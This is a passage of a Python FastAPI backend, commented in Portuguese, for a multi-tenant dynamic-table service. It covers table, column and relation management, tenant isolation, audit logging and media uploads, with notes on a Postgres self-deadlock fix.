        # v1 é SÓ-LEITURA por decisão: ligar escrita via key reabre o
        # vocabulário inteiro de mutação (defaults, FK, coerção de tipo,
        # refcount de mídia) e não paga na primeira versão. O escopo já aceita
        # `write` pra que ligar depois não seja migration.
        raise HTTPException(
            status_code=403,
            detail="API keys são somente-leitura nesta versão.",
        )
    if not api_keys.allows(principal.scopes, api_keys.READ, table_name):
        raise HTTPException(
            status_code=403,
            detail=f"A key não tem escopo de leitura para '{table_name}'.",
        )
    return db_table


def public_tenant_db(table_name: str, db: Session = Depends(get_db)):
    """Resolve a tabela pública pelo nome lógico e seta `app.tenant_id`.

    Sempre usa o `tenant_id` da própria linha de `_tables` — nunca master,
    nunca confia em quem chamou (endpoint público, sem auth).
    """
    db_table = db.query(models.DynamicTable).filter(
        models.DynamicTable.name == table_name,
        models.DynamicTable.is_public == True,
    ).first()
    if not db_table:
        raise HTTPException(status_code=404, detail="Table not found or not public")
    try:
        set_tenant_for_session(db, db_table.tenant_id)
        yield db, db_table
        db.commit()
    except Exception:
        db.rollback()
        raise
    finally:
        if db.bind is not None and db.bind.dialect.name == "postgresql":
            try:
                db.execute(text("RESET ALL"))
            except Exception:
                pass


def _load_physical_table(db_table: models.DynamicTable) -> Table:
    """Reflete a tabela física do tenant a partir do metadata de `_tables`.

    Postgres → schema-qualified (`tenant_N.clientes`).
    SQLite   → prefixo legado (`t{tenant_id}_clientes`). Reconstruído a
    partir de `tenant_id + name` por ser determinístico; ignora
    `physical_name` (que para linhas legadas pode estar sem prefixo).
    """
    meta = MetaData()
    if is_postgres():
        schema = db_table.schema_name
        physical = db_table.physical_name or db_table.name
        return Table(physical, meta, autoload_with=engine, schema=schema)
    physical = f"t{db_table.tenant_id}_{db_table.name}"
    return Table(physical, meta, autoload_with=engine)


def _end_read_txn_before_ddl(db: Session) -> None:
    """Encerra a transação de LEITURA da sessão do request antes de um DDL físico.

    BUG-PG01. Quem lê uma tabela física por `db` (captura de valores de mídia
    pra refcount) deixa a transação ABERTA nesta conexão, segurando
    ACCESS SHARE sobre a tabela. O DDL que vem em seguida
    (`drop_physical_column` / `drop_physical_table`) NÃO usa esta sessão: ele
    abre uma conexão própria com `engine.begin()` (dynamic_schema.py:248 e
    :263) e o `ALTER`/`DROP` exige ACCESS EXCLUSIVE. Resultado: a conexão do
    DDL espera pela conexão da leitura, que só seria liberada pelo
    `db.commit()` no fim do handler — inalcançável, porque a mesma thread está
    parada no DDL. A thread espera por ela mesma.

    É auto-deadlock INFINITO, não lentidão: o app não seta `lock_timeout` nem
    `statement_timeout` (grep=0), então nada interrompe. Cada ocorrência ainda
    queima uma conexão do pool 5+10 (database.py:21).

    `rollback` e não `commit`: até este ponto a sessão só leu — não há o que
    persistir, e rollback é mais barato e mais honesto sobre a intenção.

    Efeito colateral necessário: apaga o GUC `app.tenant_id`, que é
    transaction-local (`set_config(..., is_local=true)`, tenant_context.py:62).
    Nada depois disso precisa dele — `media_cleanup` escopa `_assets` por
    `owner_id` explícito (media_cleanup.py:31) e o DDL usa conexão própria. Se
    algum dia entrar leitura de tabela física DEPOIS deste ponto, o
    `set_tenant_for_session` tem que ser refeito (precedente: main.py:1927).

    Por que passou 2 milestones despercebido: só ocorre em Postgres. Em SQLite
    o pool é StaticPool (conexão ÚNICA — leitura e DDL compartilham a mesma, sem
    conflito de lock) e o drop-column nem chega ao banco (dynamic_schema.py:243,
    decisão F0). A suíte nunca rodou em Postgres até 2026-07-16.
    """
    db.rollback()


# ==========================================
# Table Management
# ==========================================

@app.post("/tables/", response_model=schemas.TableResponse)
def create_table(table: schemas.TableCreate, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_active_user)):
    # Moderators and admins can create tables
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Master cannot create tables directly. Use an admin account.")

    # M9 F4: a régua do NOME (forma + tamanho) roda no schema; aqui fica só a
    # trava de reservados, que depende das rotas e o schema não conhece.
    try:
        schemas.validate_table_name(table.name, RESERVED_TABLE_NAMES)
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))


    # Determine owner (admin or mod's parent admin)
    if current_user.role == "admin":
        owner_id = current_user.id
    else:
        owner_id = current_user.parent_id
    
    # Validate group access if group_id is provided
    if table.group_id:
        group = db.query(models.DatabaseGroup).filter(models.DatabaseGroup.id == table.group_id).first()
        if not group:
            raise HTTPException(status_code=404, detail="Database group not found")
        if current_user.role == "admin" and group.admin_id != current_user.id:
            raise HTTPException(status_code=403, detail="Not your group")
        if current_user.role == "moderator":
            has_perm = db.query(models.ModeratorPermission).filter(
                models.ModeratorPermission.moderator_id == current_user.id,
                models.ModeratorPermission.database_group_id == table.group_id
            ).first()
            if not has_perm:
                raise HTTPException(status_code=403, detail="No permission for this group")
    
    # 1. Register in meta table
    db_table = models.DynamicTable(
        name=table.name,
        description=table.description,
        source=table.source,          # M8.5 F3: proveniência (import preenche via TableCreate.source)
        owner_id=owner_id,
        group_id=table.group_id,
        is_public=table.is_public,
        tenant_id=owner_id,           # tenant = admin dono (master pode setar owner_id de qualquer admin)
        physical_name=table.name,     # mesmo valor durante a transição; sanitização em Fase 3
    )
    db.add(db_table)
    db.commit()
    db.refresh(db_table)

    # 2. Register columns + collect FK specs
    cols_data_for_ddl = []
    fk_specs = []  # [{from_col, to_table (LOGICAL), to_col, to_table_id}]

    for col in table.columns:
        db_col = models.DynamicColumn(
            table_id=db_table.id,
            name=col.name,
            data_type=col.data_type,
            is_nullable=col.is_nullable,
            is_unique=col.is_unique,
            is_primary=col.is_primary,
            fk_table=col.fk_table if col.fk_table else None,
            fk_column=col.fk_column if col.fk_column else None,
        )
        db.add(db_col)
        cols_data_for_ddl.append({
            'name': col.name,
            'data_type': col.data_type,
            'is_nullable': col.is_nullable,
            'is_unique': col.is_unique,
            'is_primary': col.is_primary
        })
        if col.fk_table and col.fk_column:
            ref_table = db.query(models.DynamicTable).filter(
                models.DynamicTable.name == col.fk_table,
                models.DynamicTable.owner_id == owner_id
            ).first()
            if ref_table:
                fk_specs.append({
                    'from_col': col.name,
                    'to_table': col.fk_table,        # nome LÓGICO; dynamic_schema resolve por engine.
                    'to_col': col.fk_column,
                    'to_table_id': ref_table.id,
                })
    db.commit()

    # 3. Create physical table (with FK constraints if any)
    physical_fks = [
        {'from_col': f['from_col'], 'to_table': f['to_table'], 'to_col': f['to_col']}
        for f in fk_specs
    ]
    success, msg, schema_name, physical_name = create_physical_table(
        table.name, cols_data_for_ddl, tenant_id=owner_id, foreign_keys=physical_fks or None,
    )
    if not success:
        db.delete(db_table)
        db.commit()
        raise HTTPException(status_code=400, detail=msg)

    db_table.schema_name = schema_name
    db_table.physical_name = physical_name
    db.commit()
    db.refresh(db_table)

    # 4. Register DynamicRelation records for each FK
    for fk in fk_specs:
        rel = models.DynamicRelation(
            name=f"{table.name}_{fk['from_col']}_fk",
            from_table_id=db_table.id,
            to_table_id=fk['to_table_id'],
            relation_type="many_to_one",
            from_column_name=fk['from_col'],
            to_column_name=fk['to_col'],
        )
        db.add(rel)
    db.commit()

    db.refresh(db_table)
    # M9 F1: caminho NÃO-ATÔMICO (a tabela física já existe e o metadado já
    # commitou 3x acima) — best-effort, senão um bug de audit devolveria erro
    # numa tabela que foi criada de verdade.
    audit.record_best_effort(
        db, owner_id=owner_id, actor=audit.user_actor(current_user),
        action=audit.TABLE_CREATE, target_type=audit.T_TABLE,
        target_id=db_table.id, target_label=db_table.name,
        changed_columns=[c.name for c in table.columns],
        details={"is_public": bool(db_table.is_public), "group_id": db_table.group_id},
    )
    return db_table

@app.get("/tables/", response_model=List[schemas.TableResponse])
def get_tables(
    request: Request = None,
    db: Session = Depends(tenant_db_principal),
    principal: Principal = Depends(get_principal),
):
    """M9 F2: é catálogo, e a key alcança (decisão do Diretor). Sem isso a
    credencial de máquina não DESCOBRE o que pode ler — só acerta quem já sabe
    o nome exato da tabela, e o MCP do M11 nasceria castrado.

    Pra key, a lista é filtrada pelo ESCOPO: mostrar o catálogo inteiro
    revelaria os nomes das tabelas que ela não pode ler."""
    current_user = principal.user
    tables = get_accessible_tables(current_user, db)
    if principal.is_key:
        permitidas = set(api_keys.normalize_scopes(principal.scopes).get(api_keys.READ) or [])
        tables = [t for t in tables if t.name in permitidas]
        audit.record(
            db, owner_id=principal.user.id, actor=principal_actor(principal, request),
            action=audit.CATALOG_READ, target_type=audit.T_WORKSPACE,
            target_id=principal.user.id,
            details={"tables": len(tables)},
        )
    result = []
    for t in tables:
        column_count = db.query(models.DynamicColumn).filter(models.DynamicColumn.table_id == t.id).count()
        relation_count = db.query(models.DynamicRelation).filter(models.DynamicRelation.from_table_id == t.id).count()
        # row_count usa nome físico correto (schema-qualified em PG, prefixo em SQLite).
        # Em savepoint pra não abortar a transação se a tabela física não existir
        # (ex.: registro órfão em `_tables` após crash).
        if is_postgres():
            schema = t.schema_name or "public"
            physical = t.physical_name or t.name
            qualified = f'"{schema}"."{physical}"'
        else:
            physical = f"t{t.tenant_id}_{t.name}"
            qualified = f'"{physical}"'
        row_count = 0
        try:
            with db.begin_nested():
                row_count = db.execute(text(f"SELECT COUNT(*) FROM {qualified}")).scalar() or 0
        except Exception:
            row_count = 0
        resp = schemas.TableResponse.model_validate(t)
        resp.meta = schemas.TableMeta(
            row_count=row_count,
            column_count=column_count,
            relation_count=relation_count,
        )
        result.append(resp)
    return result

# ==========================================
# Relations API (FEAT-01)
# ==========================================

@app.post("/api/relations", response_model=schemas.RelationResponse)
def create_relation(rel: schemas.RelationCreate, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_admin)):
    """Create a logical relation record (physical FK already created at table creation time)."""
    # Ownership (M-Ops F3 / achado do painel M7): ambos os lados precisam ser
    # tabelas acessíveis ao usuário (admin = as suas; master = todas). Sem isto,
    # qualquer admin criava relação referenciando tabela de outro tenant.
    accessible_ids = {t.id for t in get_accessible_tables(current_user, db)}
    if rel.from_table_id not in accessible_ids or rel.to_table_id not in accessible_ids:
        raise HTTPException(status_code=403, detail="Relation must reference tables you own")
    new_rel = models.DynamicRelation(
        name=rel.name,
        from_table_id=rel.from_table_id,
        to_table_id=rel.to_table_id,
        relation_type=rel.relation_type,
        from_column_name=rel.from_column_name,
        to_column_name=rel.to_column_name,
    )
    db.add(new_rel)
    db.flush()
    _from = db.query(models.DynamicTable).filter(models.DynamicTable.id == rel.from_table_id).first()
    audit.record(
        db, owner_id=(_from.owner_id if _from else None), actor=audit.user_actor(current_user),
        action=audit.RELATION_CREATE, target_type=audit.T_RELATION,
        target_id=new_rel.id, target_label=new_rel.name,
        details={"from_table_id": rel.from_table_id, "to_table_id": rel.to_table_id,
                 "from_column": rel.from_column_name, "to_column": rel.to_column_name},
    )
    db.commit()
    db.refresh(new_rel)
    return new_rel

@app.get("/api/relations/", response_model=List[schemas.WorkspaceRelationInfo])
def get_workspace_relations(
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """M7 PR2b: TODAS as relações do workspace numa chamada (Schema Visualizer).

    Workspace-scoped via get_accessible_tables nos DOIS lados da relação —
    deliberadamente NÃO herda o comportamento do per-table, que devolve o
    to_table sem checar acesso. Moderator só vê relações entre tabelas dos
    seus grupos; o que fica de fora aparece no visualizer como contagem
    discreta (derivada das FKs de coluna), não como dado vazado.

    Relações com column names NULL entram (o per-table as descarta).
    """
    accessible = {t.id: t for t in get_accessible_tables(current_user, db)}
    if not accessible:
        return []
    rels = db.query(models.DynamicRelation).filter(
        models.DynamicRelation.from_table_id.in_(accessible.keys()),
        models.DynamicRelation.to_table_id.in_(accessible.keys()),
    ).all()
    return [
        schemas.WorkspaceRelationInfo(
            id=r.id,
            name=r.name,
            from_table=accessible[r.from_table_id].name,
            from_column_name=r.from_column_name,
            to_table=accessible[r.to_table_id].name,
            to_column_name=r.to_column_name,
            relation_type=r.relation_type,
        )
        for r in rels
    ]

@app.get("/api/relations/table/{table_name}", response_model=List[schemas.RelationInfo])
def get_relations_for_table(table_name: str, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_active_user)):
    """Return FK relations where the given table is the 'from' side."""
    accessible = get_accessible_tables(current_user, db)
    db_table = next((t for t in accessible if t.name == table_name), None)
    if not db_table:
        raise HTTPException(status_code=404, detail="Table not found or no access")
    relations = db.query(models.DynamicRelation).filter(
        models.DynamicRelation.from_table_id == db_table.id
    ).all()
    result = []
    for r in relations:
        to_table = db.query(models.DynamicTable).filter(models.DynamicTable.id == r.to_table_id).first()
        if to_table and r.from_column_name and r.to_column_name:
            result.append(schemas.RelationInfo(
                id=r.id,
                name=r.name,
                from_table=db_table.name,
                from_column_name=r.from_column_name,
                to_table=to_table.name,
                to_column_name=r.to_column_name,
                relation_type=r.relation_type,
            ))
    return result

@app.delete("/api/relations/{relation_id}")
def delete_relation(relation_id: int, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_admin)):
    rel = db.query(models.DynamicRelation).filter(models.DynamicRelation.id == relation_id).first()
    if not rel:
        raise HTTPException(status_code=404, detail="Relation not found")
    # Ownership: só remove relação cujo lado FROM é tabela acessível. 404 (não
    # 403) pra não revelar a existência de relação de outro tenant.
    accessible_ids = {t.id for t in get_accessible_tables(current_user, db)}
    if rel.from_table_id not in accessible_ids:
        raise HTTPException(status_code=404, detail="Relation not found")
    _rid, _rname, _from_id = rel.id, rel.name, rel.from_table_id
    db.delete(rel)
    _from = db.query(models.DynamicTable).filter(models.DynamicTable.id == _from_id).first()
    audit.record(
        db, owner_id=(_from.owner_id if _from else None), actor=audit.user_actor(current_user),
        action=audit.RELATION_DELETE, target_type=audit.T_RELATION,
        target_id=_rid, target_label=_rname,
    )
    db.commit()
    return {"message": "Relation deleted"}

@app.patch("/tables/{table_id}/visibility")
def toggle_table_visibility(table_id: int, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_admin)):
    table = db.query(models.DynamicTable).filter(models.DynamicTable.id == table_id).first()
    if not table:
        raise HTTPException(status_code=404, detail="Table not found")
    if current_user.role != "master" and table.owner_id != current_user.id:
        raise HTTPException(status_code=403, detail="Not your table")
    try:
        table.is_public = not bool(table.is_public)
        # Expõe (ou esconde) o tenant pro mundo pela API pública — evento de
        # alto valor forense, e por isso G1 o nomeia explicitamente.
        audit.record(
            db, owner_id=table.owner_id, actor=audit.user_actor(current_user),
            action=audit.TABLE_VISIBILITY, target_type=audit.T_TABLE,
            target_id=table.id, target_label=table.name,
            details={"is_public": bool(table.is_public)},
        )
        db.commit()
        db.refresh(table)
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Failed to update visibility: {str(e)}")
    return {"is_public": table.is_public}


@app.patch("/tables/{table_id}/source")
def update_table_source(table_id: int, body: schemas.TableSourceUpdate,
                        db: Session = Depends(get_db),
                        current_user: models.User = Depends(get_current_admin)):
    """M8.5 F3: edita a proveniência citável da tabela (a origem que o impresso
    acadêmico cita). Mesma régua do toggle de visibilidade (admin dono; master
    de qualquer). `source` vazio/None limpa — o acadêmico volta a citar só o
    metadado do snapshot, nunca inventa fonte."""
    table = db.query(models.DynamicTable).filter(models.DynamicTable.id == table_id).first()
    if not table:
        raise HTTPException(status_code=404, detail="Table not found")
    if current_user.role != "master" and table.owner_id != current_user.id:
        raise HTTPException(status_code=403, detail="Not your table")
    src = (body.source or "").strip() or None
    try:
        table.source = src
        # A proveniência é o que o impresso acadêmico CITA — mudar a origem
        # muda o que o artefato afirma. Guarda o fato, não o texto anterior.
        audit.record(
            db, owner_id=table.owner_id, actor=audit.user_actor(current_user),
            action=audit.TABLE_SOURCE, target_type=audit.T_TABLE,
            target_id=table.id, target_label=table.name,
            changed_columns=["source"], details={"cleared": src is None},
        )
        db.commit()
        db.refresh(table)
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Failed to update source: {str(e)}")
    return {"source": table.source}

# ==========================================
# Schema Mutation (M8 F0) — add/drop column, delete table
# ==========================================

def _accessible_table_or_404(table_id: int, current_user: models.User, db: Session) -> models.DynamicTable:
    """Tabela do id se acessível; 403 pra master, 404 sem acesso.

    Mesma régua do create_table (admin = as suas; moderador = grupos
    permitidos via get_accessible_tables); master não muta schema direto.
    """
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Master não muta schema diretamente. Use uma conta admin.")
    db_table = next((t for t in get_accessible_tables(current_user, db) if t.id == table_id), None)
    if not db_table:
        raise HTTPException(status_code=404, detail="Table not found or no access")
    return db_table


@app.post("/tables/{table_id}/columns", response_model=schemas.ColumnResponse)
def add_table_column(
    table_id: int,
    col: schemas.ColumnCreate,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """M8 F0: adiciona uma coluna a uma tabela existente (ALTER ADD COLUMN)."""
    db_table = _accessible_table_or_404(table_id, current_user, db)

    # F0 não adiciona PK nem FK via ALTER — rejeita explícito.
    if col.is_primary:
        raise HTTPException(status_code=400, detail="Não dá pra adicionar coluna como chave primária a tabela existente.")
    if col.fk_table or col.fk_column:
        raise HTTPException(status_code=400, detail="FK em coluna nova não é suportado na F0 (defina FKs na criação da tabela).")
    # NOT NULL sem default não cabe numa tabela já criada (F0 não tem default).
    if not col.is_nullable:
        raise HTTPException(status_code=400, detail="Coluna nova precisa ser nullable na F0 (sem default ainda).")
    # nome único na tabela + barra colunas de sistema.
    existing = {c.name for c in db_table.columns}
    if col.name in existing or col.name in ("id", "tenant_id"):
        raise HTTPException(status_code=400, detail=f"Já existe (ou é reservada) a coluna '{col.name}'.")

    # Metadado primeiro, DDL física depois — espelha create_table (rollback do
    # ORM se a física falhar).
    db_col = models.DynamicColumn(
        table_id=db_table.id, name=col.name, data_type=col.data_type,
        is_nullable=col.is_nullable, is_unique=col.is_unique, is_primary=False,
    )
    db.add(db_col)
    db.commit()
    db.refresh(db_col)

    success, msg = add_physical_column(
        db_table.tenant_id, db_table.name, col.name, col.data_type,
        is_nullable=col.is_nullable, is_unique=col.is_unique,
        schema_name=db_table.schema_name, physical_name=db_table.physical_name,
    )
    if not success:
        db.delete(db_col)
        db.commit()
        raise HTTPException(status_code=400, detail=f"Falha ao adicionar coluna física: {msg}")
    # M9 F1: só DEPOIS do ALTER dar certo — o rollback acima desfaz o metadado,
    # e uma trilha de coluna que não existe é pior que nenhuma.
    audit.record_best_effort(
        db, owner_id=db_table.owner_id, actor=audit.user_actor(current_user),
        action=audit.COLUMN_ADD, target_type=audit.T_TABLE, target_id=db_table.id,
        target_label=db_table.name, changed_columns=[col.name],
        details={"data_type": col.data_type, "is_unique": bool(col.is_unique)},
    )
    return db_col


@app.delete("/tables/{table_id}/columns/{column_id}")
def drop_table_column(
    table_id: int,
    column_id: int,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """M8 F0: remove uma coluna (ALTER DROP COLUMN). Só Postgres na F0."""
    db_table = _accessible_table_or_404(table_id, current_user, db)
    db_col = db.query(models.DynamicColumn).filter(
        models.DynamicColumn.id == column_id,
        models.DynamicColumn.table_id == table_id,
    ).first()
    if not db_col:
        raise HTTPException(status_code=404, detail="Column not found")

    # Guards de coluna especial: PK/id/tenant_id não saem.
    if db_col.is_primary or db_col.name in ("id", "tenant_id"):
        raise HTTPException(status_code=400, detail="Não dá pra dropar coluna de sistema/PK (id, tenant_id).")
    # Coluna em relação → bloqueia (evita _relations órfã e FK física pendente).
    rel = db.query(models.DynamicRelation).filter(
        models.DynamicRelation.from_table_id == table_id,
        models.DynamicRelation.from_column_name == db_col.name,
    ).first() or db.query(models.DynamicRelation).filter(
        models.DynamicRelation.to_table_id == table_id,
        models.DynamicRelation.to_column_name == db_col.name,
    ).first()
    if rel:
        raise HTTPException(status_code=400, detail=f"Coluna '{db_col.name}' é usada na relação '{rel.name}'. Remova a relação primeiro.")

    # F1: coluna mídia → captura os valores ANTES do DROP físico pra decrementar
    # refcount. Este endpoint usa get_db (sem GUC de RLS) — sem o set_tenant o
    # FORCE RLS devolveria 0 rows silenciosamente em Postgres e o cleanup
    # viraria no-op só em prod. Blob NÃO é removido aqui (decisão #3) — GC cuida.
    dropped_media_values: list = []
    if (db_col.data_type or "") in schemas.MEDIA_TYPES:
        try:
            set_tenant_for_session(db, db_table.tenant_id)
            _phys = _load_physical_table(db_table)
            if db_col.name in _phys.columns:
                dropped_media_values = [
                    r[0] for r in db.execute(select(_phys.c[db_col.name])).fetchall()
                ]
        except Exception:
            dropped_media_values = []  # física ausente → nada a decrementar

    # BUG-PG01: identidade em locais ANTES de encerrar a transação — o rollback
    # expira os objetos ORM, e cada atributo lido depois dispararia um SELECT novo.
    _tenant_id = db_table.tenant_id
    _table_name = db_table.name
    _schema_name = db_table.schema_name
    _physical_name = db_table.physical_name
    _col_name = db_col.name
    # M9 F1: a identidade pro audit também sai daqui, pelo mesmo motivo — ler
    # `db_table.owner_id` depois do rollback dispararia SELECT novo.
    _owner_id = db_table.owner_id
    _table_pk = db_table.id
    _col_type = db_col.data_type

    # BUG-PG01: sem isto, o ALTER abaixo espera pela leitura acima pra sempre.
    _end_read_txn_before_ddl(db)

    success, msg = drop_physical_column(
        _tenant_id, _table_name, _col_name,
        schema_name=_schema_name, physical_name=_physical_name,
    )
    if not success:
        raise HTTPException(status_code=400, detail=f"Falha ao dropar coluna física: {msg}")
    media_cleanup.adjust_for_values(db, _tenant_id, dropped_media_values, -1)
    db.delete(db_col)
    db.commit()
    # M9 F1: dropar coluna apaga o dado dela — evento de alto valor forense.
    # Best-effort porque o DROP físico já aconteceu em conexão própria.
    audit.record_best_effort(
        db, owner_id=_owner_id, actor=audit.user_actor(current_user),
        action=audit.COLUMN_DROP, target_type=audit.T_TABLE, target_id=_table_pk,
        target_label=_table_name, changed_columns=[_col_name],
        details={"data_type": _col_type},
    )
    return {"message": f"Column {_col_name} dropped"}


@app.delete("/tables/{table_id}")
def delete_table(
    table_id: int,
    confirm_name: str = Query(..., description="nome exato da tabela — confirmação anti-acidente"),
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """M8 F0: deleta uma tabela (hard-delete). Exige `confirm_name` == nome."""
    db_table = _accessible_table_or_404(table_id, current_user, db)
    if confirm_name != db_table.name:
        raise HTTPException(status_code=400, detail="Confirmação inválida: informe o nome exato da tabela.")

    # F1: valores das colunas mídia capturados ANTES do DROP (depois não há
    # de onde ler) pra decrementar refcount. get_db sem GUC → set_tenant
    # obrigatório (FORCE RLS). Blob não sai aqui (decisão #3) — GC cuida.
    dropped_media_values: list = []
    _media_cols = media_cleanup.media_column_names(db_table)
    if _media_cols:
        try:
            set_tenant_for_session(db, db_table.tenant_id)
            _phys = _load_physical_table(db_table)
            _cols = [_phys.c[c] for c in _media_cols if c in _phys.columns]
            if _cols:
                for row in db.execute(select(*_cols)).fetchall():
                    dropped_media_values.extend(row)
        except Exception:
            dropped_media_values = []

    # BUG-PG01: identidade em locais ANTES de encerrar a transação (ver
    # _end_read_txn_before_ddl).
    _tenant_id = db_table.tenant_id
    _table_name = db_table.name
    _schema_name = db_table.schema_name
    _physical_name = db_table.physical_name
    # M9 F1: idem — e aqui o ponteiro do alvo é SOFT justamente por isto: a
    # linha de `_tables` deixa de existir, e o evento tem que sobreviver a ela.
    _owner_id = db_table.owner_id
    _table_pk = db_table.id
    _col_names = [c.name for c in db_table.columns]

    # BUG-PG01: sem isto, o DROP abaixo espera pela leitura acima pra sempre.
    # Este caminho é PIOR que o do drop-column: `drop_physical_table` não é
    # Postgres-only, então o teste roda e PASSA em SQLite.
    _end_read_txn_before_ddl(db)

    # Física primeiro (idempotente IF EXISTS) — se falhar, o ORM fica intacto e
    # a operação é retentável. CASCADE em PG trata FK física entrante.
    success, msg = drop_physical_table(
        _tenant_id, _table_name,
        schema_name=_schema_name, physical_name=_physical_name,
    )
    if not success:
        raise HTTPException(status_code=400, detail=f"Falha ao dropar tabela física: {msg}")
    media_cleanup.adjust_for_values(db, _tenant_id, dropped_media_values, -1)
    db.delete(db_table)  # cascade ORM: _columns + from/to_relations
    db.commit()
    audit.record_best_effort(
        db, owner_id=_owner_id, actor=audit.user_actor(current_user),
        action=audit.TABLE_DELETE, target_type=audit.T_TABLE, target_id=_table_pk,
        target_label=_table_name, changed_columns=_col_names,
    )
    return {"message": f"Table {_table_name} deleted"}

# ==========================================
# Media Library (M8 F1) — upload + _assets
# ==========================================
# Registrado ANTES do bloco dinâmico /api/{table_name} — Starlette casa rotas
# por ordem de registro; literal declarada depois seria engolida.

# M9 F4: nomes reservados COMPUTADOS das rotas reais, não escritos à mão.
#
# A lista manual tinha só `assets` e já estava desatualizada: medido, os
# literais que de fato sombreiam são `admins`, `all-users`, `assets`,
# `database-groups`, `moderators` e `relations`. Uma lista escrita à mão volta a
# atrasar na próxima rota nova — foi o que aconteceu entre o M8 e o M9.
#
# **Só literal de 1 SEGMENTO sombreia.** A rota dinâmica ocupa `/api/{tabela}`
# com GET e POST; `/api/views/me` tem 2 segmentos e por isso NÃO conflita — o
# probe do M8.5 F1 mediu que uma tabela chamada "views" continua acessível.
# Reservar `views`/`keys`/`webhooks` seria proibir nome legítimo à toa.
def _compute_reserved_table_names() -> tuple[str, ...]:
    nomes = set()
    for rota in app.routes:
        partes = [p for p in getattr(rota, "path", "").split("/") if p]
        if len(partes) == 2 and partes[0] == "api" and not partes[1].startswith("{"):
            nomes.add(partes[1].lower())
    return tuple(sorted(nomes))


# Preenchido no startup, quando todas as rotas já foram registradas — este
# módulo ainda está sendo lido aqui, e metade das rotas não existe.
RESERVED_TABLE_NAMES: tuple[str, ...] = ("assets",)


def _media_tenant_or_403(current_user: models.User) -> int:
    """Mesma régua do schema mutation: master não usa a biblioteca (403).
    Admin e moderador sim — biblioteca é do workspace INTEIRO, sem recorte
    por grupo (decisão Diretor 2026-07-05)."""
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Master não usa a Media Library. Use uma conta admin.")
    return resolve_tenant_id(current_user)


def _asset_dict(a: models.Asset) -> dict:
    return {
        "id": a.id,
        "url": media_storage.public_url(a.path),
        "mime": a.mime,
        "size_bytes": a.size_bytes,
        "original_name": a.original_name,
        "refcount": a.refcount,
        "uploaded_by": a.uploaded_by,
        "created_at": a.created_at.isoformat() if a.created_at else None,
    }


@app.post("/api/assets/upload")
def upload_asset(
    request: Request,
    file: UploadFile = File(...),
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """M8 F1: sobe um arquivo pro bucket de mídia e registra em `_assets`.

    Proxy pelo backend (decisão #2). `refcount` nasce 0 — incrementa quando
    uma célula referenciar a URL devolvida. O teto é checado DUAS vezes:
    Content-Length antes do read (não bufferiza 200MB pra depois negar) e
    len() real depois (Content-Length é declarativo, cliente pode mentir).
    """
    tenant_id = _media_tenant_or_403(current_user)

    max_mb = media_storage.MAX_FILE_BYTES // (1024 * 1024)
    declared = request.headers.get("content-length", "")
    # Folga de 16KB pro envelope multipart (boundary + headers do form).
    if declared.isdigit() and int(declared) > media_storage.MAX_FILE_BYTES + 16_384:
        raise HTTPException(status_code=413, detail=f"Arquivo excede o teto de {max_mb}MB.")

    mime = (file.content_type or "").split(";")[0].strip().lower()
    if mime not in media_storage.ALLOWED_MIME:
        raise HTTPException(status_code=415, detail=f"Tipo de arquivo não permitido: '{mime or 'desconhecido'}'.")

    content = file.file.read(media_storage.MAX_FILE_BYTES + 1)
    if len(content) > media_storage.MAX_FILE_BYTES:
        raise HTTPException(status_code=413, detail=f"Arquivo excede o teto de {max_mb}MB.")
    if not content:
        raise HTTPException(status_code=400, detail="Arquivo vazio.")

    # F5: sniffing de conteúdo (in-memory, mais barato que a query da quota) —
    # o MIME declarado já passou na whitelist acima; aqui os BYTES têm que bater.
    if not media_storage.sniff_ok(content, mime):
        raise HTTPException(status_code=415, detail="O conteúdo do arquivo não corresponde ao tipo declarado.")

    # F5: quota agregada por workspace (250MB) — antes de escrever no Storage.
    used = db.query(func.coalesce(func.sum(models.Asset.size_bytes), 0)).filter(
        models.Asset.owner_id == tenant_id
    ).scalar() or 0
    if used + len(content) > media_storage.WORKSPACE_QUOTA_BYTES:
        quota_mb = media_storage.WORKSPACE_QUOTA_BYTES // (1024 * 1024)
        raise HTTPException(status_code=413, detail=f"Cota do workspace ({quota_mb}MB) atingida. Libere espaço na biblioteca.")

    original_name = os.path.basename(file.filename or "arquivo")[:200]
    ext = os.path.splitext(original_name)[1].lower()
    if not (1 < len(ext) <= 11 and ext[0] == "." and ext[1:].isalnum()):
        ext = ""
    import uuid as _uuid
    path = f"{tenant_id}/{_uuid.uuid4().hex}{ext}"  # opaco, imutável (decisão #4)

    try:
        media_storage.upload(path, content, mime)
    except Exception:
        logger.exception("upload de mídia falhou (Storage)")
        raise HTTPException(status_code=502, detail="Storage de mídia indisponível. Tente novamente.")

    asset = models.Asset(
        owner_id=tenant_id,
        uploaded_by=current_user.id,
        path=path,
        mime=mime,
        size_bytes=len(content),
        original_name=original_name,
        refcount=0,
    )
    db.add(asset)
    db.flush()
    audit.record(
        db, owner_id=tenant_id, actor=audit.user_actor(current_user, request),
        action=audit.ASSET_UPLOAD, target_type=audit.T_ASSET,
        target_id=asset.id, target_label=original_name,
        details={"mime": mime, "size_bytes": len(content)},
    )
    db.commit()
    db.refresh(asset)
    return _asset_dict(asset)


@app.get("/api/assets")
def list_assets(
    limit: int = 100,
    offset: int = 0,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """M8 F1: biblioteca do workspace, paginada (mais novo primeiro)."""
    tenant_id = _media_tenant_or_403(current_user)
    q = db.query(models.Asset).filter(models.Asset.owner_id == tenant_id)
    total = q.count()
    rows = (
        q.order_by(models.Asset.created_at.desc(), models.Asset.id.desc())
        .limit(min(limit, 500))
        .offset(offset)
        .all()
    )
